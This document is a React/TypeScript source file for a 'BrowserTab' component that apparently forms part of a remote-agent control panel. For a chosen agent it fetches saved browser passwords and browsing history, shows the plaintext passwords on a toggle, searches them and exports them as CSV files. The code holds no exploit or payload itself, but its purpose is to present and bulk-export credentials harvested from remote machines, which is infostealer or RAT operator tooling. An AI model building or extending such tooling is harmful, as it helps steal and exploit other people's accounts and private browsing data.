import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Skeleton, Tabs, Chip, Accordion, Input, TextField } from '@heroui/react';
import { Eye, EyeSlash, ArrowRotateLeft, ChevronDown, Globe, Magnifier, ArrowDownToLine } from '@gravity-ui/icons';
import { getBrowser, searchBrowser } from '../../api/othersoft';
import type { BrowserPassword, BrowserHistory, BrowserDataType } from '../../types/models';

interface BrowserTabProps {
  agentId: string;
}

const PAGE_SIZE = 250;

function usePagedData<T>(agentId: string, type: BrowserDataType) {
  const [items, setItems] = useState<T[]>([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [errors, setErrors] = useState<string[]>([]);
  const offsetRef = useRef(0);
  const hasMoreRef = useRef(true);

  const fetchPage = useCallback(async (reset = false) => {
    if (loading) return;
    const offset = reset ? 0 : offsetRef.current;
    if (!reset && !hasMoreRef.current) return;
    setLoading(true);
    try {
      const res = await getBrowser<T>(agentId, type, offset, PAGE_SIZE);
      setTotal(res.total);
      if (res.errors?.length) setErrors(prev => [...prev, ...res.errors]);
      const newItems = res.items ?? [];
      if (reset) {
        setItems(newItems);
        offsetRef.current = newItems.length;
      } else {
        setItems(prev => [...prev, ...newItems]);
        offsetRef.current = offset + newItems.length;
      }
      hasMoreRef.current = offsetRef.current < res.total;
    } catch {
      setErrors(prev => [...prev, `Failed to fetch ${type}`]);
    } finally {
      setLoading(false);
      setInitialLoading(false);
    }
  }, [agentId, type, loading]);

  const reset = useCallback(() => {
    setItems([]);
    setTotal(0);
    setErrors([]);
    offsetRef.current = 0;
    hasMoreRef.current = true;
    setInitialLoading(true);
  }, []);

  return { items, total, loading, initialLoading, errors, hasMore: hasMoreRef, fetchPage, reset };
}

function ScrollLoader({ loading, hasMore, onLoadMore }: { loading: boolean; hasMore: boolean; onLoadMore: () => void }) {
  const sentinelRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!hasMore || loading) return;
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0]?.isIntersecting) onLoadMore();
    }, { rootMargin: '200px' });
    obs.observe(el);
    return () => obs.disconnect();
  }, [hasMore, loading, onLoadMore]);
  return <div ref={sentinelRef} className="h-4">{loading && <Skeleton className="h-8 rounded-xl mt-2" />}</div>;
}

// CSV export helper
function downloadCsv(filename: string, headers: string[], rows: (string | number)[][]) {
  const csvContent = [
    headers.join(','),
    ...rows.map(row => row.map(cell => {
      const s = String(cell ?? '');
      return s.includes(',') || s.includes('"') || s.includes('\n')
        ? `"${s.replace(/"/g, '""')}"` : s;
    }).join(','))
  ].join('\n');

  const BOM = '\uFEFF';
  const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

export function BrowserTab({ agentId }: BrowserTabProps) {
  const { t } = useTranslation();
  const [subTab, setSubTab] = useState<string>('passwords');
  const [showAllPasswords, setShowAllPasswords] = useState(false);

  // Search state
  const [searchKeyword, setSearchKeyword] = useState('');
  const [searchLoading, setSearchLoading] = useState(false);
  const [searchResults, setSearchResults] = useState<BrowserPassword[] | BrowserHistory[] | null>(null);
  const [searchTotal, setSearchTotal] = useState(0);
  const [searchError, setSearchError] = useState<string | null>(null);

  // Export dialog state
  const [showExportMenu, setShowExportMenu] = useState(false);

  const pw = usePagedData<BrowserPassword>(agentId, 'passwords');
  const hs = usePagedData<BrowserHistory>(agentId, 'history');

  const filteredPasswords = useMemo(() => {
    const source = searchResults && subTab === 'passwords'
      ? (searchResults as BrowserPassword[])
      : pw.items;
    return source.filter(p => p.url || p.username || p.password);
  }, [pw.items, searchResults, subTab]);

  const filteredHistory = useMemo(() => {
    if (searchResults && subTab === 'history') return searchResults as BrowserHistory[];
    return hs.items;
  }, [hs.items, searchResults, subTab]);

  useEffect(() => { pw.fetchPage(true); }, [agentId]);

  const handleTabChange = useCallback((key: string) => {
    setSubTab(key);
    setSearchResults(null);
    setSearchKeyword('');
    setSearchError(null);
    const store = key === 'passwords' ? pw : hs;
    if (store.initialLoading && store.items.length === 0) store.fetchPage(true);
  }, [pw, hs]);

  const handleRefresh = useCallback(() => {
    setSearchResults(null);
    setSearchKeyword('');
    setSearchError(null);
    const store = subTab === 'passwords' ? pw : hs;
    store.reset();
    setTimeout(() => store.fetchPage(true), 0);
  }, [subTab, pw, hs]);

  const handleSearch = useCallback(async () => {
    const keyword = searchKeyword.trim();
    if (!keyword) return;
    setSearchLoading(true);
    setSearchError(null);
    setSearchResults(null);
    try {
      const dataType: BrowserDataType = subTab === 'passwords' ? 'passwords' : 'history';
      const res = await searchBrowser(agentId, dataType, keyword);
      setSearchResults(res.items ?? []);
      setSearchTotal(res.total);
    } catch (err: unknown) {
      setSearchError(err instanceof Error ? err.message : String(err));
    } finally {
      setSearchLoading(false);
    }
  }, [agentId, subTab, searchKeyword]);

  const handleExport = useCallback((exportAll: boolean) => {
    setShowExportMenu(false);

    if (subTab === 'passwords') {
      const data = exportAll ? pw.items : filteredPasswords;
      downloadCsv(
        `browser_passwords${searchKeyword ? '_search' : ''}.csv`,
        ['Browser', 'URL', 'Username', 'Password', 'Version'],
        data.map(p => [p.browser, p.url, p.username, p.password, p.version])
      );
    } else {
      const data = exportAll ? hs.items : filteredHistory;
      downloadCsv(
        `browser_history${searchKeyword ? '_search' : ''}.csv`,
        ['Browser', 'URL', 'Title', 'Visits'],
        data.map(h => [h.browser, h.url, h.title, h.visits])
      );
    }
  }, [subTab, pw.items, hs.items, filteredPasswords, filteredHistory, searchKeyword]);

  const passwordsByDomain = useMemo(() => {
    const map = new Map<string, (BrowserPassword & { key: string })[]>();
    for (let i = 0; i < filteredPasswords.length; i++) {
      const p = filteredPasswords[i]!;
      let domain: string;
      try { domain = new URL(p.url).hostname; } catch { domain = p.url || '(other)'; }
      if (!map.has(domain)) map.set(domain, []);
      map.get(domain)!.push({ ...p, key: `${i}` });
    }
    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
  }, [filteredPasswords]);

  const historyByHost = useMemo(() => {
    const source = searchResults && subTab === 'history'
      ? (searchResults as BrowserHistory[])
      : hs.items;
    const map = new Map<string, (BrowserHistory & { key: string })[]>();
    for (let i = 0; i < source.length; i++) {
      const h = source[i]!;
      let host: string;
      try { host = new URL(h.url).hostname; } catch { host = '(other)'; }
      if (!map.has(host)) map.set(host, []);
      map.get(host)!.push({ ...h, key: `${i}` });
    }
    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
  }, [hs.items, searchResults, subTab]);

  const currentErrors = subTab === 'passwords' ? pw.errors : hs.errors;
  const isSearching = searchResults !== null;
  const currentTotal = isSearching ? searchTotal : (subTab === 'passwords' ? pw.total : hs.total);

  if (pw.initialLoading && subTab === 'passwords') {
    return (
      <div className="space-y-3">
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
      </div>
    );
  }

  return (
    <div className="space-y-3">
      {/* Toolbar */}
      <div className="flex items-center justify-between">
        <div className="flex gap-2">
          <Chip variant="soft" color="accent">{t('othersoft.browser.passwords')}: {pw.total}</Chip>
          <Chip variant="soft" color="default">{t('othersoft.browser.history')}: {hs.total}</Chip>
        </div>
        <div className="flex gap-2 items-center">
          <Button size="sm" variant="ghost" onPress={() => setShowAllPasswords(v => !v)}>
            {showAllPasswords ? <EyeSlash className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </Button>
          <Button size="sm" variant="ghost" onPress={handleRefresh}>
            <ArrowRotateLeft className="w-4 h-4" />
          </Button>
          <div className="relative">
            <Button size="sm" variant="ghost" onPress={() => setShowExportMenu(v => !v)}>
              <ArrowDownToLine className="w-4 h-4" />
            </Button>
            {showExportMenu && (
              <div className="absolute right-0 top-full mt-1 z-50 bg-white dark:bg-neutral-900 border border-neutral-200 dark:border-neutral-700 rounded-lg shadow-lg py-1 min-w-[160px]">
                <button
                  className="w-full text-left px-3 py-1.5 text-sm hover:bg-neutral-100 dark:hover:bg-neutral-800"
                  onClick={() => handleExport(true)}
                >
                  {t('othersoft.browser.exportAll')} ({currentTotal})
                </button>
                {isSearching && (
                  <button
                    className="w-full text-left px-3 py-1.5 text-sm hover:bg-neutral-100 dark:hover:bg-neutral-800"
                    onClick={() => handleExport(false)}
                  >
                    {t('othersoft.browser.exportSearch')} ({searchTotal})
                  </button>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Search bar */}
      <div className="flex gap-2 items-center">
        <TextField variant="secondary" value={searchKeyword} onChange={setSearchKeyword} className="flex-1">
          <Input
            placeholder={t('othersoft.browser.searchPlaceholder')}
            onKeyDown={(e) => { if (e.key === 'Enter') handleSearch(); }}
          />
        </TextField>
        <Button size="sm" variant="primary" isDisabled={searchLoading || !searchKeyword.trim()} onPress={handleSearch}>
          {searchLoading ? (
            <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            <Magnifier className="w-4 h-4" />
          )}
        </Button>
        {isSearching && (
          <Button size="sm" variant="ghost" onPress={() => { setSearchResults(null); setSearchKeyword(''); setSearchError(null); }}>
            {t('othersoft.browser.clearSearch')}
          </Button>
        )}
      </div>

      {searchError && (
        <div className="text-danger-500 text-sm">{searchError}</div>
      )}
      {isSearching && !searchLoading && (
        <div className="text-sm text-default-500">
          {t('othersoft.browser.searchResults', { count: searchTotal, keyword: searchKeyword })}
        </div>
      )}

      {currentErrors.length > 0 && (
        <div className="text-danger-500 text-sm">{currentErrors.join('; ')}</div>
      )}

      <Tabs selectedKey={subTab} onSelectionChange={(key) => handleTabChange(String(key))}>
        <Tabs.ListContainer>
          <Tabs.List aria-label="Browser data">
            <Tabs.Tab id="passwords">{t('othersoft.browser.passwords')}<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="history">{t('othersoft.browser.history')}<Tabs.Indicator /></Tabs.Tab>
          </Tabs.List>
        </Tabs.ListContainer>
        <Tabs.Panel id="passwords">
          {filteredPasswords.length === 0 && !pw.loading ? (
            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
          ) : (
            <div className="max-h-[600px] overflow-y-auto">
              <Accordion className="w-full">
                {passwordsByDomain.map(([domain, items]) => (
                  <Accordion.Item key={domain}>
                    <Accordion.Heading>
                      <Accordion.Trigger>
                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
                        <span className="flex-1 text-left">{domain}</span>
                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
                      </Accordion.Trigger>
                    </Accordion.Heading>
                    <Accordion.Panel>
                      <Accordion.Body>
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b border-neutral-200 dark:border-neutral-700">
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.source')}</th>
                              <th className="text-left py-1.5 px-2">URL</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.username')}</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.password')}</th>
                            </tr>
                          </thead>
                          <tbody>
                            {items.map((p) => (
                              <tr key={p.key} className="border-b border-neutral-100 dark:border-neutral-800">
                                <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{p.browser}</Chip></td>
                                <td className="py-1.5 px-2 max-w-[300px] truncate font-mono text-xs" title={p.url}>{p.url}</td>
                                <td className="py-1.5 px-2">{p.username}</td>
                                <td className="py-1.5 px-2 font-mono">{showAllPasswords ? p.password : '••••••••'}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </Accordion.Body>
                    </Accordion.Panel>
                  </Accordion.Item>
                ))}
              </Accordion>
              {!isSearching && <ScrollLoader loading={pw.loading} hasMore={pw.hasMore.current} onLoadMore={() => pw.fetchPage()} />}
            </div>
          )}
        </Tabs.Panel>

        <Tabs.Panel id="history">
          {filteredHistory.length === 0 && !hs.loading ? (
            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
          ) : (
            <div className="max-h-[600px] overflow-y-auto">
              <Accordion className="w-full">
                {historyByHost.map(([host, items]) => (
                  <Accordion.Item key={host}>
                    <Accordion.Heading>
                      <Accordion.Trigger>
                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
                        <span className="flex-1 text-left">{host}</span>
                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
                      </Accordion.Trigger>
                    </Accordion.Heading>
                    <Accordion.Panel>
                      <Accordion.Body>
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b border-neutral-200 dark:border-neutral-700">
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.pageTitle')}</th>
                              <th className="text-left py-1.5 px-2">URL</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.visits')}</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.source')}</th>
                            </tr>
                          </thead>
                          <tbody>
                            {items.map((h) => (
                              <tr key={h.key} className="border-b border-neutral-100 dark:border-neutral-800">
                                <td className="py-1 px-2 max-w-[250px] truncate" title={h.title}>{h.title || '-'}</td>
                                <td className="py-1 px-2 max-w-[300px] truncate font-mono text-xs" title={h.url}>{h.url}</td>
                                <td className="py-1 px-2">{h.visits}</td>
                                <td className="py-1 px-2"><Chip size="sm" variant="soft">{h.browser}</Chip></td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </Accordion.Body>
                    </Accordion.Panel>
                  </Accordion.Item>
                ))}
              </Accordion>
              {!isSearching && <ScrollLoader loading={hs.loading} hasMore={hs.hasMore.current} onLoadMore={() => hs.fetchPage()} />}
            </div>
          )}
        </Tabs.Panel>
      </Tabs>
    </div>
  );
}
